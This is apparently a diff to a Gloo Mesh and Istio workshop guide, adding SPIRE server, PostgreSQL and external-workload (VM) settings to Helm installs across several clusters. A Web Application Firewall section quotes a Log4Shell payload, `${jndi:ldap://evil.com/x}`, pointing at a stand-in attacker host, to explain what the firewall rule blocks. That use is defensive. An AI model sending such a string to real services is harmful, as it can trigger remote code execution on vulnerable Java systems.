@@ -118,9 +118,9 @@ export CLUSTER2=cluster2
 Run the following commands to deploy three Kubernetes clusters using [Kind](https://kind.sigs.k8s.io/):
 
 ```bash
-./scripts/deploy-multi-with-calico.sh 1 mgmt
-./scripts/deploy-multi-with-calico.sh 2 cluster1 us-west us-west-1
-./scripts/deploy-multi-with-calico.sh 3 cluster2 us-west us-west-2
+./scripts/deploy-aws-with-calico.sh 1 mgmt
+./scripts/deploy-aws-with-calico.sh 2 cluster1 us-west us-west-1
+./scripts/deploy-aws-with-calico.sh 3 cluster2 us-west us-west-2
 ```
 
 Then run the following commands to wait for all the Pods to be ready:
@@ -196,6 +196,7 @@ Pull and push locally the Docker images needed:
 ```bash
 cat <<'EOF' > images.txt
 docker.io/curlimages/curl
+docker.io/bitnami/postgresql:16.1.0-debian-11-r15
 docker.io/kennethreitz/httpbin
 docker.io/nginx:1.25.3
 docker.io/openpolicyagent/opa:0.57.1-debug
@@ -205,9 +206,11 @@ gcr.io/gloo-mesh/gloo-mesh-agent:2.5.0
 gcr.io/gloo-mesh/gloo-mesh-apiserver:2.5.0
 gcr.io/gloo-mesh/gloo-mesh-envoy:2.5.0
 gcr.io/gloo-mesh/gloo-mesh-mgmt-server:2.5.0
+gcr.io/gloo-mesh/gloo-mesh-spire-controller:2.5.0
 gcr.io/gloo-mesh/gloo-mesh-ui:2.5.0
 gcr.io/gloo-mesh/gloo-otel-collector:2.5.0
 gcr.io/gloo-mesh/rate-limiter:0.11.7
+ghcr.io/spiffe/spire-server:1.8.6
 jimmidyson/configmap-reload:v0.8.0
 quay.io/keycloak/keycloak:22.0.5
 quay.io/prometheus/prometheus:v2.41.0
@@ -221,7 +224,7 @@ us-docker.pkg.dev/gloo-mesh/istio-workshops/proxyv2:1.19.3-solo
 us-docker.pkg.dev/gloo-mesh/istio-workshops/proxyv2:1.20.2-solo
 EOF
 
-for url in https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/platform/kube/bookinfo.yaml https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/networking/bookinfo-gateway.yaml
+for url in https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/platform/kube/bookinfo.yaml https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/networking/bookinfo-gateway.yaml https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/platform/kube/bookinfo-ratings-v2-mysql-vm.yaml
 do
   for image in $(curl -sfL ${url}|grep image:|awk '{print $2}')
   do
@@ -301,6 +304,8 @@ helm upgrade --install gloo-platform-crds gloo-platform-crds \
   --repo https://storage.googleapis.com/gloo-platform/helm-charts \
   --namespace gloo-mesh \
   --kube-context ${MGMT} \
+  --set featureGates.ExternalWorkloads=true \
+  --set enabledExperimentalApi="{externalworkloads.networking.gloo.solo.io/v2alpha1,spireregistrationentries.internal.gloo.solo.io/v2alpha1}" \
   --version 2.5.0
 
 helm upgrade --install gloo-platform gloo-platform \
@@ -310,7 +315,7 @@ helm upgrade --install gloo-platform gloo-platform \
   --version 2.5.0 \
   -f -<<EOF
 licensing:
-  licenseKey: ${GLOO_MESH_LICENSE_KEY}
+  glooTrialLicenseKey: ${GLOO_MESH_LICENSE_KEY}
 common:
   cluster: mgmt
 glooInsightsEngine:
@@ -335,6 +340,8 @@ redis:
     enabled: true
     image:
       registry: ${registry}
+featureGates:
+  ExternalWorkloads: true
 telemetryGateway:
   enabled: true
   image:
@@ -359,6 +366,7 @@ telemetryCollector:
   image:
     repository: ${registry}/gloo-mesh/gloo-otel-collector
   enabled: true
+
 EOF
 
 kubectl --context ${MGMT} -n gloo-mesh rollout status deploy/gloo-mesh-mgmt-server
@@ -479,6 +487,8 @@ helm upgrade --install gloo-platform-crds gloo-platform-crds \
   --repo https://storage.googleapis.com/gloo-platform/helm-charts \
   --namespace gloo-mesh \
   --kube-context ${CLUSTER1} \
+  --set featureGates.ExternalWorkloads=true \
+  --set enabledExperimentalApi="{externalworkloads.networking.gloo.solo.io/v2alpha1,spireregistrationentries.internal.gloo.solo.io/v2alpha1}" \
   --version 2.5.0
 
 helm upgrade --install gloo-platform gloo-platform \
@@ -504,6 +514,34 @@ telemetryCollector:
     exporters:
       otlp:
         endpoint: "${ENDPOINT_TELEMETRY_GATEWAY}"
+glooSpireServer:
+  enabled: true
+  image:
+    registry: ${registry}/spiffe
+  sidecars:
+    glooSpireController:
+      image:
+        registry: ${registry}/gloo-mesh
+  controller:
+    verbose: true
+  server:
+    trustDomain: cluster1
+postgresql:
+  enabled: true
+  global:
+    imageRegistry: ${registry}
+    postgresql:
+      auth:
+        database: spire
+        password: gloomesh
+        username: spire
+telemetryCollectorCustomization:
+  pipelines:
+    metrics/otlp_relay:
+      enabled: true
+      pipeline:
+        processors:
+        - batch
   image:
     repository: ${registry}/gloo-mesh/gloo-otel-collector
 EOF
@@ -538,6 +576,8 @@ helm upgrade --install gloo-platform-crds gloo-platform-crds \
   --repo https://storage.googleapis.com/gloo-platform/helm-charts \
   --namespace gloo-mesh \
   --kube-context ${CLUSTER2} \
+  --set featureGates.ExternalWorkloads=true \
+  --set enabledExperimentalApi="{externalworkloads.networking.gloo.solo.io/v2alpha1,spireregistrationentries.internal.gloo.solo.io/v2alpha1}" \
   --version 2.5.0
 
 helm upgrade --install gloo-platform gloo-platform \
@@ -563,6 +603,34 @@ telemetryCollector:
     exporters:
       otlp:
         endpoint: "${ENDPOINT_TELEMETRY_GATEWAY}"
+glooSpireServer:
+  enabled: true
+  image:
+    registry: ${registry}/spiffe
+  sidecars:
+    glooSpireController:
+      image:
+        registry: ${registry}/gloo-mesh
+  controller:
+    verbose: true
+  server:
+    trustDomain: cluster2
+postgresql:
+  enabled: true
+  global:
+    imageRegistry: ${registry}
+    postgresql:
+      auth:
+        database: spire
+        password: gloomesh
+        username: spire
+telemetryCollectorCustomization:
+  pipelines:
+    metrics/otlp_relay:
+      enabled: true
+      pipeline:
+        processors:
+        - batch
   image:
     repository: ${registry}/gloo-mesh/gloo-otel-collector
 EOF
@@ -3137,7 +3205,7 @@ The Log4Shell vulnerability impacted all Java applications that used the log4j l
 
 Using the Web Application Firewall capabilities you can reject requests containing such headers. 
 
-Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That’s what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
+Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That's what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
 
 Create the WAF policy:
 
@@ -4403,6 +4471,7 @@ kubectl --context ${CLUSTER1} delete accesspolicies -n bookinfo-frontends --all
 
 ## Lab 24 - VM integration with Spire <a name="lab-24---vm-integration-with-spire-"></a>
 
+
 Let's see how we can configure a VM to be part of the Mesh.
 
 To make it easier (and more fun), we'll use a Docker container to simulate a VM.
@@ -4561,9 +4630,17 @@ EOF
 
 <!--bash
 uuid_regex="^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$"
-
+start_time=$(date +%s) # Capture start time
+duration=120 # Set duration for 2 minutes (120 seconds)
 # Loop until JOIN_TOKEN matches the UUID format
 while [[ ! "${JOIN_TOKEN}" =~ ${uuid_regex} ]]; do
+    current_time=$(date +%s)
+    elapsed=$((current_time - start_time))
+    if [[ $elapsed -ge $duration ]]; then
+        echo "Timeout reached. Exiting loop."
+        break
+    fi
+
     echo "Waiting for JOIN_TOKEN to have the correct format..."
     export JOIN_TOKEN=$(meshctl external-workload gen-token --kubecontext ${CLUSTER1} --ext-workload virtualmachines/${VM_APP} --trust-domain ${CLUSTER1} --plain 2>&1 | grep INFO | awk '{ print $4}')
     sleep 1 # Pause for 1 second
@@ -4587,6 +4664,16 @@ export EW_GW_ADDR=$(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l i
 ```
 
 Register the VM:
+<!--bash
+echo -n Waiting for EW be ready...
+timeout -v 1m bash -c "
+until nc -z ${EW_GW_ADDR} 31338;
+do
+  sleep 1
+  echo -n .
+done"
+echo
+-->
 
 ```bash
 export GLOO_AGENT_URL=https://storage.googleapis.com/gloo-platform/vm/v2.5.0/gloo-workload-agent.deb
@@ -4707,6 +4794,12 @@ docker exec vm1 mysql -u root -ppassword test -e "select * from ratings;"
 ```
 
 Deploy a new version of the ratings service that is using the database and scale down the current version:
+Update the registry in our bookinfo manifests:
+
+```bash
+sed -i'' -e "s/image: docker.io/image: ${registry}/g" \
+  data/steps/vm-integration-spire/bookinfo-ratings-v2-mysql-vm.yaml
+```
 
 ```bash
 kubectl --context ${CLUSTER1} -n bookinfo-backends apply -f data/steps/vm-integration-spire/bookinfo-ratings-v2-mysql-vm.yaml
@@ -5740,7 +5833,7 @@ We can use it later to check the failover hasn't impacted the Istio configuratio
 We're going to deploy a new Kubernetes cluster to host the standby Gloo Platform management plane:
 
 ```bash
-./scripts/deploy-multi-with-calico.sh 4 mgmt2
+./scripts/deploy-aws-with-calico.sh 4 mgmt2
 ```
 
 Then, run the following commands to wait for all the Pods to be ready:
@@ -5799,7 +5892,7 @@ helm upgrade --install gloo-platform gloo-platform \
   --version 2.5.0 \
   -f -<<EOF
 licensing:
-  licenseKey: ${GLOO_MESH_LICENSE_KEY}
+  glooTrialLicenseKey: ${GLOO_MESH_LICENSE_KEY}
 common:
   cluster: mgmt
 glooInsightsEngine:
@@ -5824,6 +5917,8 @@ redis:
     enabled: true
     image:
       registry: ${registry}
+featureGates:
+  ExternalWorkloads: true
 telemetryGateway:
   enabled: true
   image:
@@ -5848,6 +5943,7 @@ telemetryCollector:
   image:
     repository: ${registry}/gloo-mesh/gloo-otel-collector
   enabled: true
+
 EOF
 
 kubectl --context ${MGMT2} -n gloo-mesh rollout status deploy/gloo-mesh-mgmt-server
@@ -6016,6 +6112,8 @@ helm upgrade --install gloo-platform-crds gloo-platform-crds \
   --repo https://storage.googleapis.com/gloo-platform/helm-charts \
   --namespace gloo-mesh \
   --kube-context ${CLUSTER1} \
+  --set featureGates.ExternalWorkloads=true \
+  --set enabledExperimentalApi="{externalworkloads.networking.gloo.solo.io/v2alpha1,spireregistrationentries.internal.gloo.solo.io/v2alpha1}" \
   --version 2.5.0
 
 helm upgrade --install gloo-platform gloo-platform \
@@ -6041,6 +6139,34 @@ telemetryCollector:
     exporters:
       otlp:
         endpoint: "${ENDPOINT_TELEMETRY_GATEWAY}"
+glooSpireServer:
+  enabled: true
+  image:
+    registry: ${registry}/spiffe
+  sidecars:
+    glooSpireController:
+      image:
+        registry: ${registry}/gloo-mesh
+  controller:
+    verbose: true
+  server:
+    trustDomain: cluster1
+postgresql:
+  enabled: true
+  global:
+    imageRegistry: ${registry}
+    postgresql:
+      auth:
+        database: spire
+        password: gloomesh
+        username: spire
+telemetryCollectorCustomization:
+  pipelines:
+    metrics/otlp_relay:
+      enabled: true
+      pipeline:
+        processors:
+        - batch
   image:
     repository: ${registry}/gloo-mesh/gloo-otel-collector
 EOF
@@ -6069,6 +6195,8 @@ helm upgrade --install gloo-platform-crds gloo-platform-crds \
   --repo https://storage.googleapis.com/gloo-platform/helm-charts \
   --namespace gloo-mesh \
   --kube-context ${CLUSTER2} \
+  --set featureGates.ExternalWorkloads=true \
+  --set enabledExperimentalApi="{externalworkloads.networking.gloo.solo.io/v2alpha1,spireregistrationentries.internal.gloo.solo.io/v2alpha1}" \
   --version 2.5.0
 
 helm upgrade --install gloo-platform gloo-platform \
@@ -6094,6 +6222,34 @@ telemetryCollector:
     exporters:
       otlp:
         endpoint: "${ENDPOINT_TELEMETRY_GATEWAY}"
+glooSpireServer:
+  enabled: true
+  image:
+    registry: ${registry}/spiffe
+  sidecars:
+    glooSpireController:
+      image:
+        registry: ${registry}/gloo-mesh
+  controller:
+    verbose: true
+  server:
+    trustDomain: cluster2
+postgresql:
+  enabled: true
+  global:
+    imageRegistry: ${registry}
+    postgresql:
+      auth:
+        database: spire
+        password: gloomesh
+        username: spire
+telemetryCollectorCustomization:
+  pipelines:
+    metrics/otlp_relay:
+      enabled: true
+      pipeline:
+        processors:
+        - batch
   image:
     repository: ${registry}/gloo-mesh/gloo-otel-collector
 EOF
